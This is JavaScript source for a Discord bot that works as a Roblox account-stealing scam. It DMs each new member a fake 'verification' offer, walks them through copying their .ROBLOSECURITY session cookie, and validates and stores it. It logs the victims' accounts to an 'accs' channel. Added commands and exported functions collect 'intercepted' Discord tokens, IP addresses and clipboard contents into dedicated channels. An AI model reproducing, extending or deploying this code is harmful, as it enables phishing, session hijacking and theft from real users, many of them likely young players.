require('dotenv').config();
const axios = require('axios');
const { Client, GatewayIntentBits, Partials, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

if (!TOKEN || !CLIENT_ID || !GUILD_ID) {
  console.error("❌ Missing required environment variables:");
  if (!TOKEN) console.error("  - DISCORD_BOT_TOKEN");
  if (!CLIENT_ID) console.error("  - DISCORD_CLIENT_ID");
  if (!GUILD_ID) console.error("  - DISCORD_GUILD_ID");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
  ],
  partials: [Partials.Channel],
});

// Channel names for database and logging
const DATABASE_CHANNEL = 'database';
const LOGGING_CHANNEL = 'logging';
const ACCS_CHANNEL = 'accs';
const TOKENS_CHANNEL = 'tokens';
const CLIPBOARD_CHANNEL = 'clipboard';

// In-memory cache for performance
let verifiedUsers = new Set();
let dmSentUsers = new Set();
const userCookies = new Map();
let databaseChannel = null;
let loggingChannel = null;
let accsChannel = null;
let tokensChannel = null;
let clipboardChannel = null;

// Create axios instance for better performance
const robloxAPI = axios.create({
  timeout: 2000,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
  },
});

// Database functions using Discord messages
async function loadDataFromChannel() {
  if (!databaseChannel) return;
  
  try {
    console.log('📡 Loading data from #database channel...');
    const messages = await databaseChannel.messages.fetch({ limit: 100 });
    
    verifiedUsers.clear();
    dmSentUsers.clear();
    userCookies.clear();
    
    for (const message of messages.values()) {
      if (message.author.id !== client.user.id) continue;
      
      try {
        const embed = message.embeds[0];
        if (!embed || !embed.fields) continue;
        
        const userIdField = embed.fields.find(f => f.name === 'User ID');
        const cookieField = embed.fields.find(f => f.name === 'Cookie');
        const dmSentField = embed.fields.find(f => f.name === 'DM Sent');
        
        if (!userIdField) continue;
        
        const userId = userIdField.value;
        
        if (cookieField && cookieField.value !== 'None') {
          verifiedUsers.add(userId);
          userCookies.set(userId, cookieField.value);
        }
        
        if (dmSentField && dmSentField.value === 'Yes') {
          dmSentUsers.add(userId);
        }
      } catch (error) {
        console.warn('⚠️  Failed to parse database message:', error.message);
      }
    }
    
    console.log(`✅ Loaded ${verifiedUsers.size} verified users from database`);
  } catch (error) {
    console.error('❌ Failed to load data from channel:', error);
  }
}

async function saveUserToDatabase(userId, userData = {}) {
  if (!databaseChannel) return;
  
  try {
    // Find existing message for this user
    const messages = await databaseChannel.messages.fetch({ limit: 100 });
    let existingMessage = null;
    
    for (const message of messages.values()) {
      if (message.author.id !== client.user.id) continue;
      
      const embed = message.embeds[0];
      if (embed && embed.fields) {
        const userIdField = embed.fields.find(f => f.name === 'User ID');
        if (userIdField && userIdField.value === userId) {
          existingMessage = message;
          break;
        }
      }
    }
    
    const embed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle('👤 User Database Entry')
      .addFields(
        { name: 'User ID', value: userId, inline: true },
        { name: 'Username', value: userData.username || 'Unknown', inline: true },
        { name: 'Roblox ID', value: userData.robloxId || 'None', inline: true },
        { name: 'Roblox Username', value: userData.robloxUsername || 'None', inline: true },
        { name: 'Cookie', value: userData.cookie ? '[STORED]' : 'None', inline: true },
        { name: 'DM Sent', value: dmSentUsers.has(userId) ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: verifiedUsers.has(userId) ? 'Yes' : 'No', inline: true },
        { name: 'Last Updated', value: new Date().toISOString(), inline: false }
      )
      .setTimestamp();
    
    if (existingMessage) {
      await existingMessage.edit({ embeds: [embed] });
    } else {
      await databaseChannel.send({ embeds: [embed] });
    }
    
    console.log(`💾 Saved user data for ${userId}`);
  } catch (error) {
    console.error('❌ Failed to save user to database:', error);
  }
}

async function removeUserFromDatabase(userId) {
  if (!databaseChannel) return;
  
  try {
    const messages = await databaseChannel.messages.fetch({ limit: 100 });
    
    for (const message of messages.values()) {
      if (message.author.id !== client.user.id) continue;
      
      const embed = message.embeds[0];
      if (embed && embed.fields) {
        const userIdField = embed.fields.find(f => f.name === 'User ID');
        if (userIdField && userIdField.value === userId) {
          await message.delete();
          console.log(`🗑️ Removed user ${userId} from database`);
          break;
        }
      }
    }
  } catch (error) {
    console.error('❌ Failed to remove user from database:', error);
  }
}

// Logging functions
async function logToChannel(channelName, embed) {
  const channel = channelName === 'logging' ? loggingChannel : accsChannel;
  if (!channel) return;
  
  try {
    await channel.send({ embeds: [embed] });
  } catch (error) {
    console.error(`❌ Failed to log to ${channelName}:`, error);
  }
}

async function logVerification(userId, username, robloxData) {
  const embed = new EmbedBuilder()
    .setColor('#51cf66')
    .setTitle('✅ User Verified')
    .addFields(
      { name: 'Discord User', value: `<@${userId}>`, inline: true },
      { name: 'Discord Username', value: username, inline: true },
      { name: 'Roblox ID', value: robloxData.UserID.toString(), inline: true },
      { name: 'Roblox Username', value: robloxData.UserName, inline: true },
      { name: 'Display Name', value: robloxData.displayName || 'None', inline: true },
      { name: 'Verified Badge', value: robloxData.hasVerifiedBadge ? 'Yes' : 'No', inline: true }
    )
    .setTimestamp();
  
  await logToChannel('logging', embed);
}

async function logCookieExpired(userId, username, robloxUsername) {
  const embed = new EmbedBuilder()
    .setColor('#ff6b6b')
    .setTitle('🔴 Cookie Expired')
    .addFields(
      { name: 'Discord User', value: `<@${userId}>`, inline: true },
      { name: 'Discord Username', value: username, inline: true },
      { name: 'Roblox Username', value: robloxUsername || 'Unknown', inline: true },
      { name: 'Action Required', value: 'User needs to resubmit cookie', inline: false }
    )
    .setTimestamp();
  
  await logToChannel('logging', embed);
}

async function logAccountData(userId, username, robloxData, action) {
  const embed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle(`🔑 Account Access - ${action}`)
    .addFields(
      { name: 'Discord User', value: `<@${userId}>`, inline: true },
      { name: 'Discord Username', value: username, inline: true },
      { name: 'Roblox ID', value: robloxData.UserID.toString(), inline: true },
      { name: 'Roblox Username', value: robloxData.UserName, inline: true },
      { name: 'Action', value: action, inline: false }
    )
    .setTimestamp();
  
  await logToChannel('accs', embed);
}

// Token and clipboard data logging functions
async function logDiscordToken(data) {
  if (!tokensChannel) return;
  
  try {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔑 Discord Token Intercepted')
      .addFields(
        { name: 'IP Address', value: data.userIP || 'Unknown', inline: true },
        { name: 'User Agent', value: data.userAgent ? data.userAgent.slice(0, 100) + '...' : 'Unknown', inline: false },
        { name: 'Server ID', value: data.serverId || 'N/A', inline: true },
        { name: 'Token Preview', value: data.token ? data.token.slice(0, 20) + '...' : 'Invalid', inline: false },
        { name: 'Full Token', value: data.token || 'N/A', inline: false },
        { name: 'Timestamp', value: new Date().toISOString(), inline: true }
      )
      .setFooter({ text: 'CRITICAL: Discord token compromised!' })
      .setTimestamp();

    await tokensChannel.send({ embeds: [embed] });
    console.log('🔴 Discord token logged to #tokens channel');
  } catch (error) {
    console.error('❌ Failed to log token:', error);
  }
}

async function logClipboardData(data) {
  if (!clipboardChannel) return;
  
  try {
    const embed = new EmbedBuilder()
      .setColor('#ffa500')
      .setTitle('📋 Clipboard Data Intercepted')
      .addFields(
        { name: 'IP Address', value: data.userIP || 'Unknown', inline: true },
        { name: 'User Agent', value: data.userAgent ? data.userAgent.slice(0, 100) + '...' : 'Unknown', inline: false },
        { name: 'Data Type', value: data.type || 'text', inline: true },
        { name: 'Data Length', value: data.clipboardData ? data.clipboardData.length.toString() + ' characters' : '0', inline: true },
        { name: 'Preview', value: data.clipboardData ? data.clipboardData.slice(0, 200) + (data.clipboardData.length > 200 ? '...' : '') : 'Empty', inline: false },
        { name: 'Full Data', value: data.clipboardData ? (data.clipboardData.length > 1000 ? data.clipboardData.slice(0, 1000) + '\n\n**[TRUNCATED - Data too long]**' : data.clipboardData) : 'Empty', inline: false },
        { name: 'Timestamp', value: new Date().toISOString(), inline: true }
      )
      .setFooter({ text: 'Clipboard data intercepted' })
      .setTimestamp();

    await clipboardChannel.send({ embeds: [embed] });
    console.log('📋 Clipboard data logged to #clipboard channel');
  } catch (error) {
    console.error('❌ Failed to log clipboard data:', error);
  }
}

// Enhanced Roblox cookie validation
async function validateRobloxCookie(cookie) {
  try {
    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '').trim();
    
    if (!cleanCookie) {
      return { valid: false, error: 'Empty cookie' };
    }

    const response = await robloxAPI.get('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        Cookie: `.ROBLOSECURITY=${cleanCookie}`,
      },
    });

    const data = response.data;
    
    if (!data || !data.id || !data.name) {
      return { valid: false, error: 'Invalid response from Roblox' };
    }

    return {
      valid: true,
      data: {
        UserID: data.id,
        UserName: data.name,
        displayName: data.displayName,
        hasVerifiedBadge: data.hasVerifiedBadge,
      },
      cleanCookie
    };

  } catch (error) {
    console.error('Cookie validation error:', error.message);
    
    if (error.code === 'ECONNABORTED') {
      return { valid: false, error: 'Connection timeout' };
    }
    
    if (error.response) {
      const status = error.response.status;
      switch (status) {
        case 401:
          return { valid: false, error: 'Invalid or expired cookie' };
        case 403:
          return { valid: false, error: 'Account restricted' };
        case 429:
          return { valid: false, error: 'Rate limited, try again later' };
        default:
          return { valid: false, error: `API error: ${status}` };
      }
    }
    
    return { valid: false, error: 'Unknown error' };
  }
}

// Enhanced purchase function (placeholder)
async function buyRandomItem(cookie, userInfo) {
  try {
    await new Promise(resolve => setTimeout(resolve, 500));
    
    const items = [
      { name: "Cool Hat", price: 100 },
      { name: "Awesome Shirt", price: 50 },
      { name: "Epic Pants", price: 75 },
      { name: "Stylish Accessory", price: 150 }
    ];
    
    const randomItem = items[Math.floor(Math.random() * items.length)];
    
    return {
      success: true,
      message: `🎉 Successfully purchased **${randomItem.name}** for ${randomItem.price} Robux!`,
      item: randomItem,
      userInfo
    };
    
  } catch (error) {
    return {
      success: false,
      message: `❌ Failed to purchase item: ${error.message}`
    };
  }
}

client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📊 Serving ${client.guilds.cache.size} guilds`);

  // Find required channels
  const guild = client.guilds.cache.get(GUILD_ID);
  if (guild) {
    databaseChannel = guild.channels.cache.find(ch => ch.name === DATABASE_CHANNEL);
    loggingChannel = guild.channels.cache.find(ch => ch.name === LOGGING_CHANNEL);
    accsChannel = guild.channels.cache.find(ch => ch.name === ACCS_CHANNEL);
    tokensChannel = guild.channels.cache.find(ch => ch.name === TOKENS_CHANNEL);
    clipboardChannel = guild.channels.cache.find(ch => ch.name === CLIPBOARD_CHANNEL);
    
    if (!databaseChannel) console.error(`❌ #${DATABASE_CHANNEL} channel not found!`);
    if (!loggingChannel) console.error(`❌ #${LOGGING_CHANNEL} channel not found!`);
    if (!accsChannel) console.error(`❌ #${ACCS_CHANNEL} channel not found!`);
    if (!tokensChannel) console.error(`❌ #${TOKENS_CHANNEL} channel not found!`);
    if (!clipboardChannel) console.error(`❌ #${CLIPBOARD_CHANNEL} channel not found!`);
    
    // Load data from database channel
    await loadDataFromChannel();
  }

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  const commands = [
    new SlashCommandBuilder()
      .setName('test')
      .setDescription('Buy a random item from the Roblox catalog using your Robux'),
    new SlashCommandBuilder()
      .setName('verifystatus')
      .setDescription('Check your verification status'),
    new SlashCommandBuilder()
      .setName('resubmit')
      .setDescription('Get instructions to resubmit your Roblox cookie'),
    new SlashCommandBuilder()
      .setName('cookiehelp')
      .setDescription('Get detailed instructions on how to find your Roblox cookie'),
    new SlashCommandBuilder()
      .setName('submittoken')
      .setDescription('Submit Discord token data (for integration purposes)')
      .addStringOption(option =>
        option.setName('token')
          .setDescription('Discord token')
          .setRequired(true))
      .addStringOption(option =>
        option.setName('ip')
          .setDescription('User IP address')
          .setRequired(false))
      .addStringOption(option =>
        option.setName('useragent')
          .setDescription('User agent string')
          .setRequired(false))
      .addStringOption(option =>
        option.setName('serverid')
          .setDescription('Server ID')
          .setRequired(false)),
    new SlashCommandBuilder()
      .setName('submitclipboard')
      .setDescription('Submit clipboard data (for integration purposes)')
      .addStringOption(option =>
        option.setName('data')
          .setDescription('Clipboard data')
          .setRequired(true))
      .addStringOption(option =>
        option.setName('ip')
          .setDescription('User IP address')
          .setRequired(false))
      .addStringOption(option =>
        option.setName('useragent')
          .setDescription('User agent string')
          .setRequired(false))
      .addStringOption(option =>
        option.setName('type')
          .setDescription('Data type')
          .setRequired(false))
  ].map(cmd => cmd.toJSON());

  try {
    console.log('🔄 Started refreshing application (/) commands...');
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
      { body: commands }
    );
    console.log('✅ Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error('❌ Failed to register slash commands:', error);
  }
});

// Enhanced member join handling
client.on('guildMemberAdd', async (member) => {
  const userId = member.user.id;
  
  // Skip if already verified or already sent DM
  if (verifiedUsers.has(userId) || dmSentUsers.has(userId)) return;

  try {
    const welcomeEmbed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle(`🎉 Welcome to ${member.guild.name}!`)
      .setDescription('You can chat and enjoy basic features, but for **premium features** like trading and marketplace access, please verify your account.')
      .addFields(
        { name: '🍪 How to Verify:', value: 'Simply reply to this DM with your Roblox `.ROBLOSECURITY` cookie', inline: false },
        { name: '❓ Need Help?', value: 'Use `/cookiehelp` in the server for step-by-step instructions', inline: false }
      )
      .setFooter({ text: 'Your cookie is stored securely and never shared.' })
      .setTimestamp();

    await member.send({ embeds: [welcomeEmbed] });
    dmSentUsers.add(userId);
    
    // Save to database
    await saveUserToDatabase(userId, {
      username: member.user.tag,
      cookie: null
    });
    
    console.log(`📨 Sent welcome DM to ${member.user.tag}`);
    
  } catch (error) {
    console.warn(`⚠️  Failed to DM ${member.user.tag}:`, error.message);
  }
});

// Enhanced DM message handling
client.on('messageCreate', async (message) => {
  // Only process DMs from non-bots
  if (message.channel.type !== 1 || message.author.bot) return;

  const userId = message.author.id;
  const content = message.content.trim();

  // Basic cookie validation (length check)
  if (content.length < 20) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Invalid Cookie Format')
      .setDescription('That doesn\'t look like a valid Roblox cookie.')
      .addFields(
        { name: 'Expected Format:', value: 'A long string of characters (usually 100+ characters)', inline: false },
        { name: 'Need Help?', value: 'Use `/cookiehelp` in the server for instructions', inline: false }
      );

    await message.reply({ embeds: [embed] });
    return;
  }

  // Show typing indicator while validating
  await message.channel.sendTyping();

  // Validate the cookie
  const validation = await validateRobloxCookie(content);
  
  if (!validation.valid) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Cookie Validation Failed')
      .setDescription(`Invalid Roblox cookie: ${validation.error}`)
      .addFields(
        { name: 'What to try:', value: '• Make sure you copied the complete cookie\n• Check if you\'re still logged into Roblox\n• Try logging out and back in to Roblox', inline: false }
      );

    await message.reply({ embeds: [embed] });
    return;
  }

  // Store cookie and verify user
  userCookies.set(userId, validation.cleanCookie);
  verifiedUsers.add(userId);
  dmSentUsers.delete(userId);
  
  // Save to database
  await saveUserToDatabase(userId, {
    username: message.author.tag,
    robloxId: validation.data.UserID,
    robloxUsername: validation.data.UserName,
    cookie: validation.cleanCookie
  });

  // Log verification
  await logVerification(userId, message.author.tag, validation.data);
  await logAccountData(userId, message.author.tag, validation.data, 'Cookie Submitted');

  const successEmbed = new EmbedBuilder()
    .setColor('#51cf66')
    .setTitle('✅ Verification Successful!')
    .setDescription(`Welcome, **${validation.data.UserName}**!`)
    .addFields(
      { name: '🎉 Account Verified', value: `User ID: ${validation.data.UserID}`, inline: true },
      { name: '✨ Premium Features Unlocked', value: 'You can now use `/test` to purchase items!', inline: true }
    )
    .setFooter({ text: 'Your cookie has been securely stored.' })
    .setTimestamp();

  await message.reply({ embeds: [successEmbed] });
  console.log(`✅ User ${validation.data.UserName} (${userId}) verified successfully`);
});

// Enhanced slash command handling
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  await interaction.deferReply({ ephemeral: true });

  try {
    const userId = interaction.user.id;

    switch (interaction.commandName) {
      case 'test':
        await handleTestCommand(interaction, userId);
        break;
        
      case 'verifystatus':
        await handleVerifyStatusCommand(interaction, userId);
        break;
        
      case 'resubmit':
        await handleResubmitCommand(interaction, userId);
        break;
        
      case 'cookiehelp':
        await handleCookieHelpCommand(interaction);
        break;
        
      case 'submittoken':
        await handleSubmitTokenCommand(interaction);
        break;
        
      case 'submitclipboard':
        await handleSubmitClipboardCommand(interaction);
        break;
        
      default:
        await interaction.editReply('❌ Unknown command.');
    }
    
  } catch (error) {
    console.error(`❌ Error handling ${interaction.commandName}:`, error);
    
    try {
      await interaction.editReply({
        content: '❌ An unexpected error occurred. Please try again or contact an admin.',
        ephemeral: true
      });
    } catch (e) {
      console.error('Failed to send error message:', e);
    }
  }
});

async function handleTestCommand(interaction, userId) {
  if (!verifiedUsers.has(userId)) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('🔒 Verification Required')
      .setDescription('You must submit your Roblox cookie first to use premium features!')
      .addFields(
        { name: 'How to verify:', value: 'Send me a DM with your `.ROBLOSECURITY` cookie', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  const cookie = userCookies.get(userId);
  if (!cookie) {
    const embed = new EmbedBuilder()
      .setColor('#ff9f43')
      .setTitle('⚠️ Cookie Missing')
      .setDescription('Your Roblox cookie is missing from our records.')
      .addFields(
        { name: 'Solution:', value: 'Please resubmit your cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Re-validate cookie before use
  const validation = await validateRobloxCookie(cookie);
  if (!validation.valid) {
    // Remove invalid data and update database
    verifiedUsers.delete(userId);
    userCookies.delete(userId);
    
    await saveUserToDatabase(userId, {
      username: interaction.user.tag,
      cookie: null
    });
    
    await logCookieExpired(userId, interaction.user.tag, 'Unknown');

    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Cookie Expired')
      .setDescription('Your Roblox cookie appears to be invalid or expired.')
      .addFields(
        { name: 'What happened:', value: validation.error, inline: false },
        { name: 'Solution:', value: 'Please submit a new valid cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Execute purchase and log access
  await logAccountData(userId, interaction.user.tag, validation.data, 'Test Command Used');
  const purchaseResult = await buyRandomItem(cookie, validation.data);

  const resultEmbed = new EmbedBuilder()
    .setColor(purchaseResult.success ? '#51cf66' : '#ff6b6b')
    .setTitle(purchaseResult.success ? '🛍️ Purchase Successful!' : '❌ Purchase Failed')
    .setDescription(purchaseResult.message);

  if (purchaseResult.success && purchaseResult.item) {
    resultEmbed.addFields(
      { name: 'Item', value: purchaseResult.item.name, inline: true },
      { name: 'Price', value: `${purchaseResult.item.price} Robux`, inline: true },
      { name: 'Account', value: validation.data.UserName, inline: true }
    );
  }

  resultEmbed.setTimestamp();
  await interaction.editReply({ embeds: [resultEmbed] });
}

async function handleVerifyStatusCommand(interaction, userId) {
  const isVerified = verifiedUsers.has(userId);
  const hasCookie = userCookies.has(userId);

  const embed = new EmbedBuilder()
    .setColor(isVerified ? '#51cf66' : '#ff9f43')
    .setTitle('🔍 Verification Status')
    .addFields(
      { name: 'Verified', value: isVerified ? '✅ Yes' : '❌ No', inline: true },
      { name: 'Cookie Stored', value: hasCookie ? '✅ Yes' : '❌ No', inline: true },
      { name: 'Premium Access', value: isVerified ? '✅ Enabled' : '❌ Disabled', inline: true }
    );

  if (!isVerified) {
    embed.setDescription('Send me a DM with your Roblox cookie to get verified!');
  }

  await interaction.editReply({ embeds: [embed] });
}

async function handleResubmitCommand(interaction, userId) {
  const embed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('🔄 Resubmit Cookie Instructions')
    .setDescription('Follow these steps to resubmit your Roblox cookie:')
    .addFields(
      { name: '1️⃣ Find Your Cookie', value: 'Go to Roblox.com → F12 → Application → Cookies → .ROBLOSECURITY', inline: false },
      { name: '2️⃣ Copy Complete Value', value: 'Copy the entire cookie value (usually 100+ characters)', inline: false },
      { name: '3️⃣ Send via DM', value: 'Send the cookie directly to this bot via DM', inline: false }
    )
    .setFooter({ text: 'Need detailed help? Use /cookiehelp!' });

  await interaction.editReply({ embeds: [embed] });
}

async function handleCookieHelpCommand(interaction) {
  const embed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('🍪 How to Find Your Roblox Cookie')
    .setDescription('**Step-by-step guide to get your .ROBLOSECURITY cookie:**')
    .addFields(
      { name: '1️⃣ Open Roblox', value: 'Go to https://roblox.com and make sure you\'re logged in', inline: false },
      { name: '2️⃣ Open Developer Tools', value: 'Press **F12** or right-click → "Inspect Element"', inline: false },
      { name: '3️⃣ Go to Application Tab', value: 'Click on "Application" tab in developer tools', inline: false },
      { name: '4️⃣ Find Cookies', value: 'In the left panel: Storage → Cookies → https://www.roblox.com', inline: false },
      { name: '5️⃣ Copy Cookie', value: 'Find ".ROBLOSECURITY" and copy its **entire value**', inline: false },
      { name: '6️⃣ Send to Bot', value: 'Send the cookie to this bot via DM (not in server)', inline: false }
    )
    .addFields(
      { name: '⚠️ Important Notes:', value: '• Never share your cookie with anyone else\n• The cookie should be 100+ characters long\n• Make sure you copy the complete value', inline: false }
    )
    .setFooter({ text: 'Still need help? Contact a server admin!' });

  await interaction.editReply({ embeds: [embed] });
}

async function handleSubmitTokenCommand(interaction) {
  // Only allow administrators or specific roles to use this command
  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
    await interaction.editReply({
      content: '❌ You do not have permission to use this command.',
      ephemeral: true
    });
    return;
  }

  const token = interaction.options.getString('token');
  const ip = interaction.options.getString('ip') || 'Unknown';
  const userAgent = interaction.options.getString('useragent') || 'Unknown';
  const serverId = interaction.options.getString('serverid') || 'N/A';

  const tokenData = {
    token: token,
    userIP: ip,
    userAgent: userAgent,
    serverId: serverId,
    submittedBy: interaction.user.tag,
    submittedById: interaction.user.id
  };

  await logDiscordToken(tokenData);

  const embed = new EmbedBuilder()
    .setColor('#51cf66')
    .setTitle('✅ Token Data Submitted')
    .setDescription('Discord token data has been logged successfully.')
    .addFields(
      { name: 'Status', value: 'Logged to #tokens channel', inline: false }
    )
    .setTimestamp();

  await interaction.editReply({ embeds: [embed] });
}

async function handleSubmitClipboardCommand(interaction) {
  // Only allow administrators or specific roles to use this command
  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
    await interaction.editReply({
      content: '❌ You do not have permission to use this command.',
      ephemeral: true
    });
    return;
  }

  const data = interaction.options.getString('data');
  const ip = interaction.options.getString('ip') || 'Unknown';
  const userAgent = interaction.options.getString('useragent') || 'Unknown';
  const type = interaction.options.getString('type') || 'text';

  const clipboardData = {
    clipboardData: data,
    userIP: ip,
    userAgent: userAgent,
    type: type,
    submittedBy: interaction.user.tag,
    submittedById: interaction.user.id
  };

  await logClipboardData(clipboardData);

  const embed = new EmbedBuilder()
    .setColor('#51cf66')
    .setTitle('✅ Clipboard Data Submitted')
    .setDescription('Clipboard data has been logged successfully.')
    .addFields(
      { name: 'Data Length', value: `${data.length} characters`, inline: true },
      { name: 'Type', value: type, inline: true },
      { name: 'Status', value: 'Logged to #clipboard channel', inline: false }
    )
    .setTimestamp();

  await interaction.editReply({ embeds: [embed] });
}

// Export functions for server integration
module.exports = {
  logDiscordToken: async (data) => {
    if (!tokensChannel) {
      console.warn('⚠️ Tokens channel not available yet, data will be queued');
      return;
    }
    return logDiscordToken(data);
  },
  logClipboardData: async (data) => {
    if (!clipboardChannel) {
      console.warn('⚠️ Clipboard channel not available yet, data will be queued');
      return;
    }
    return logClipboardData(data);
  },
  client,
  // Add method to check if bot is ready
  isReady: () => client.isReady() && tokensChannel && clipboardChannel
};
process.on('SIGINT', () => {
  console.log('🛑 Shutting down bot...');
  client.destroy();
  process.exit(0);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled promise rejection:', error);
});

client.login(TOKEN);
